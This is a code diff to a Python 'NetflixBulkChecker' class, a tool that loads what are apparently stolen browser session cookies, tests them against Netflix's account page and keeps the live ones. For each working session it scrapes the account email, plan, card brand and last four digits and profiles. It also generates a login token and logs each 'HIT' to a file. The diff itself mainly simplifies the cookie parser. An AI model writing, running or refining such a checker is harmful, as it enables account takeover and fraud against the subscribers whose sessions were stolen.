@@ -42,65 +42,32 @@ class NetflixBulkChecker:
         return flags.get(code.upper(), '🌍')
 
     def parse_netscape_cookie(self, text):
-        """Universal parser - supports ALL common cookie formats"""
-        cookies = {}
         text = text.strip()
-        if not text:
-            return cookies
-
-        # 1. Single line full cookie string (most common when pasting)
-        if ';' in text and '=' in text:
-            for part in text.split(';'):
-                part = part.strip()
-                if '=' in part:
-                    k, v = part.split('=', 1)
-                    cookies[k.strip()] = v.strip()
-            if cookies:
-                return cookies
-
-        # 2. Line by line processing
-        for line in text.splitlines():
+        if text.startswith("NetflixId="):
+            return {"NetflixId": text.split("NetflixId=", 1)[1].strip()}
+        cookies = {}
+        for line in text.split('\n'):
             line = line.strip()
-            if not line or line.startswith('#'):
-                continue
-
-            # Netscape format with tabs
-            if '\t' in line:
-                parts = line.split('\t')
-                if len(parts) >= 7:
-                    cookies[parts[5]] = parts[6]
-                    continue
-
-            # Netscape format with spaces
-            parts = re.split(r'\s+', line)
+            if not line or line.startswith('#'): continue
+            parts = line.split('\t')
             if len(parts) >= 7:
                 cookies[parts[5]] = parts[6]
-                continue
-
-            # Simple key=value format
-            if '=' in line:
-                k, v = line.split('=', 1)
-                cookies[k.strip()] = v.strip()
-
         return cookies
 
     def check_cookie(self, cookie_text, source_name):
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
-            if not cookies:
-                return None
+            if not cookies: return None
 
             session = requests.Session()
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
 
             r = session.get('https://www.netflix.com/account/membership', timeout=20, allow_redirects=True)
-            if 'login' in r.url.lower():
-                return None
+            if 'login' in r.url.lower(): return None
 
             html = r.text
-            if '"membershipStatus":"CURRENT_MEMBER"' not in html:
-                return None
+            if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
 
             result = {
                 'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
@@ -115,7 +82,7 @@ class NetflixBulkChecker:
                 'cookie': cookie_text.strip()
             }
 
-            # Generate NF Token
+            # Generate and save NF Token properly
             try:
                 nftoken = self.generate_nftoken(cookies)
                 if nftoken:
@@ -178,7 +145,7 @@ class NetflixBulkChecker:
                     f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                     f.write(f"Profiles: {result['profiles']}\n")
                     f.write(f"Login URL: {result.get('login_url', 'N/A')}\n")
-                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n")
+                    f.write(f"NF Token: {result.get('nftoken', 'N/A')}\n")   # ← Fixed & Clean
                 print(f"{Fore.GREEN}[✓] HIT #{self.stats['hits']}: {result['email']} - {result['plan']}{Style.RESET_ALL}")
             else:
                 self.stats['bad'] += 1
